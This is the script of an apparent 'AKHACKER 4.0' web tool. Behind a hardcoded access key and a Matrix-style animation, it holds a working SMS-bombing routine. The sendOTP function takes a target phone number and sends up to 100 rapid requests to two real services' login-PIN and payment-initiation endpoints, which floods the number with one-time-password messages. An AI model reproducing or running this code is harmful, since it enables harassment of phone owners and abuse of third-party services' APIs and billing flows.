let isOpen = false;

function toggleDrawer() {
  const drawer = document.getElementById('drawer');
  const menuToggle = document.getElementById('menu-toggle');

  if (isOpen) {
    drawer.classList.remove('open');
    menuToggle.classList.remove('open');
    isOpen = false;
  } else {
    drawer.classList.add('open');
    menuToggle.classList.add('open');
    isOpen = true;
  }
}



/* ===== INLINE JAVASCRIPT ===== */


  const KEY = "AKHACKER 4.0";

  function checkKey() {
    const keyInput = document.getElementById('accessKey').value.trim();
    const loginError = document.getElementById('loginError');

    if (keyInput === KEY) {
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('mainScreen').style.display = 'block';
    } else {
      loginError.style.display = 'block';
      setTimeout(() => loginError.style.display = 'none', 3000);
    }
  }

  async function sendOTP() {
    const phone = document.getElementById('phone').value.trim();
    const count = parseInt(document.getElementById('count').value);
    const status = document.getElementById('status');

    if (!phone || isNaN(count) || count < 1 || count > 100) {
      alert('📵 Please enter a valid phone number and OTP count between 1–100.');
      return;
    }

    status.innerText = '🔄 Sending OTPs...';
    let requests = [];

    for (let i = 0; i < count; i++) {
      const url = i % 2 === 0
        ? `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`
        : `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;

      const options = i % 2 === 1 ? {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'accept': 'application/json' },
        body: JSON.stringify({
          Version: 'V1',
          Language: 'en',
          Platform: 'web',
          ProductId: 1733,
          MobileNo: phone,
          OperatorId: '100007',
          URL: 'https://www.tapmad.com/sign-up',
          source: 'organic',
          medium: 'organic'
        })
      } : { method: 'POST' };

      requests.push(
        fetch(url, options).then(() => {
          status.innerText = `✅ Sent ${i + 1} of ${count}`;
        }).catch(() => {
          status.innerText = `⚠️ Failed to send OTP ${i + 1}`;
        })
      );
    }

    await Promise.all(requests);
    status.innerText = '✅ All OTPs Sent Successfully!';
  }

  // Matrix Effect
  const canvas = document.getElementById("matrixCanvas");
  const ctx = canvas.getContext("2d");

  canvas.height = window.innerHeight;
  canvas.width = window.innerWidth;

  let letters = "AKHACKER 4.0";
  letters = letters.split("");

  let fontSize = 14;
  let columns = canvas.width / fontSize;
  let drops = [];
  for (let x = 0; x < columns; x++) drops[x] = 1;

  function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "blue";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
      let text = letters[Math.floor(Math.random() * letters.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }

  setInterval(drawMatrix, 33);
